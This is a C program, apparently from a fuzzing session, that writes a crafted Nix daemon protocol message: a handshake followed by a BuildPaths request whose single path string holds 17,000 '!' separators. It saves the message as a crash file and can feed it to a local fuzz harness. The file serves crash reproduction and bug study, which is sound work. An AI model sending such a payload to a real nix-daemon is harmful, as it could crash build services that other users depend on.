#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define SEPARATORS 17000u
#define OUTPUT_FILE "nix-buildpaths-crash.bin"

/* Set to "" if you only want to generate the file. */
#define HARNESS "/tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message"

static void put_u64_le(unsigned char *p, uint64_t v)
{
    for (int i = 0; i < 8; i++)
        p[i] = (unsigned char)(v >> (8 * i));
}

int main(void)
{
    setbuf(stdout, NULL);

    const size_t pad = (8 - (SEPARATORS % 8)) % 8;
    const size_t total = 7 * 8 + SEPARATORS + pad;

    unsigned char *payload = malloc(total);
    if (!payload)
        return 1;

    size_t o = 0;
    put_u64_le(payload + o, 0x6e697863ULL); o += 8; /* WORKER_MAGIC_1 */
    put_u64_le(payload + o, 0x125ULL);      o += 8; /* protocol 1.37 */
    put_u64_le(payload + o, 0);             o += 8; /* obsolete affinity */
    put_u64_le(payload + o, 0);             o += 8; /* obsolete reserveSpace */
    put_u64_le(payload + o, 9);             o += 8; /* Op::BuildPaths */
    put_u64_le(payload + o, 1);             o += 8; /* vector size */
    put_u64_le(payload + o, SEPARATORS);    o += 8; /* string length */

    memset(payload + o, '!', SEPARATORS);
    o += SEPARATORS;

    while (o % 8)
        payload[o++] = 0;

    FILE *f = fopen(OUTPUT_FILE, "wb");
    if (!f) {
        free(payload);
        return 1;
    }
    fwrite(payload, 1, total, f);
    fclose(f);

    printf("wrote %zu bytes to %s\n", total, OUTPUT_FILE);

    if (HARNESS[0]) {
        char cmd[1024];
        snprintf(cmd, sizeof cmd, "%s %s", HARNESS, OUTPUT_FILE);
        printf("running: %s\n", cmd);
        int rc = system(cmd);
        printf("harness exit status: %d\n", rc);
        free(payload);
        return rc == 0 ? 0 : 1;
    }

    free(payload);
    return 0;
}
